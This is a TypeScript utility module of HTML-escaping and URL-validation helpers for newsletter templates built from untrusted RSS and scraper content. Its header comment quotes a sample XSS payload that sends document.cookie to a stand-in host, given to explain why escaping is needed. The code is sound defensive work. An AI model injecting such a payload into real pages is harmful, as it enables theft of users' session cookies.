/**
 * HTML-escape helpers shared by every newsletter template (server + SPA preview).
 *
 * All article fields originate from RSS feeds and scrapers — i.e., untrusted
 * external sources. Without escaping, a malicious title like
 *   <script>fetch('https://evil/?t='+document.cookie)</script>
 * would render verbatim into the SPA preview (where it would execute in the
 * browser) and into the HTML email body. Email clients sanitize aggressively,
 * but the SPA preview is plain DOM — XSS there is real.
 *
 * Use these for ALL interpolations of feed-derived strings into HTML:
 *   - escapeHtml(text)   → text content inside elements (<h1>, <p>, <span>, ...)
 *   - escapeAttr(text)   → text inside attributes (alt="...", title="...", ...)
 *   - safeUrl(href)      → href / src attributes; rejects non-http(s) → '#'
 *
 * Examples:
 *   `<h3>${escapeHtml(article.title)}</h3>`
 *   `<a href="${safeUrl(article.link)}" title="${escapeAttr(article.title)}">`
 */

const HTML_ESCAPE_MAP: Record<string, string> = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#39;',
    '`': '&#96;',
    '/': '&#47;',
};

/**
 * Escape a string for use as element text content. Replaces &, <, >, ", ', `, /.
 * Returns '' for null/undefined.
 */
export function escapeHtml(text: unknown): string {
    if (text === null || text === undefined) return '';
    return String(text).replace(/[&<>"'`\/]/g, ch => HTML_ESCAPE_MAP[ch] || ch);
}

/**
 * Escape a string for use inside an HTML attribute value. Same as escapeHtml
 * but kept separate so future tuning (e.g., attribute-specific encoding)
 * doesn't accidentally widen escapeHtml's behavior.
 */
export function escapeAttr(text: unknown): string {
    return escapeHtml(text);
}

/**
 * Validate a URL for use in href/src attributes. Allows http and https only.
 * Returns '#' for anything else (javascript:, data:, vbscript:, file:, empty,
 * invalid URLs). Returned value is safe to drop into an attribute without
 * further escaping for the scheme component, but still pass through escapeAttr
 * because query strings can contain quotes.
 */
export function safeUrl(url: unknown): string {
    if (!url) return '#';
    const s = String(url).trim();
    if (!s) return '#';
    // Quick deny for obviously dangerous schemes regardless of URL parsing.
    if (/^\s*(javascript|data|vbscript|file):/i.test(s)) return '#';
    try {
        const u = new URL(s);
        if (u.protocol === 'http:' || u.protocol === 'https:') return s;
        return '#';
    } catch {
        return '#';
    }
}
